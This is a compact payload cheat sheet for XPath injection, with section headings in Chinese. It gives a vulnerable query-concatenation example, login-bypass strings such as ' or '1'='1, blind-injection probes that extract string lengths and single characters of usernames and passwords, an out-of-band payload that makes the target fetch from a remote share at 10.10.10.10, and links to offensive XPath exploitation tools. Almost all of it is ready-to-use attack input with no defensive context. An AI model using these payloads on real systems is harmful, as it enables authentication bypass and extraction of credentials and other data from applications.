  #### 类似sql注入
	"string(//user[name/text()='" +vuln_var1+ "' and password/text()=’" +vuln_var1+ "']/account/text())"
	' or '1'='1
	' or ''='
	x' or 1=1 or 'x'='y
	/
	//
	//*
	*/*
	@*
	count(/child::node())
	x' or name()='username' or 'x'='y
	' and count(/*)=1 and '1'='1
	' and count(/@*)=1 and '1'='1
	' and count(/comment())=1 and '1'='1
	search=')] | //user/*[contains(*,'
	search=Har') and contains(../password,'c
	search=Har') and starts-with(../password,'c
  #### 盲注
	字符串的大小
	and string-length(account)=SIZE_INT
	提取一个字符
	substring(//user[userid=5]/username,2,1)=CHAR_HERE
	substring(//user[userid=5]/username,2,1)=codepoints-to-string(INT_ORD_CHAR_HERE)
  #### OOB
  	http://example.com/?title=Foundation&type=*&rent_days=* and doc('//10.10.10.10/SHARE')
  #### 工具
  	https://github.com/orf/xcat
	https://github.com/feakk/xxxpwn
	https://github.com/aayla-secura/xxxpwn_smart
	https://github.com/micsoftvn/xpath-blind-explorer
	https://github.com/Harshal35/XMLCHOR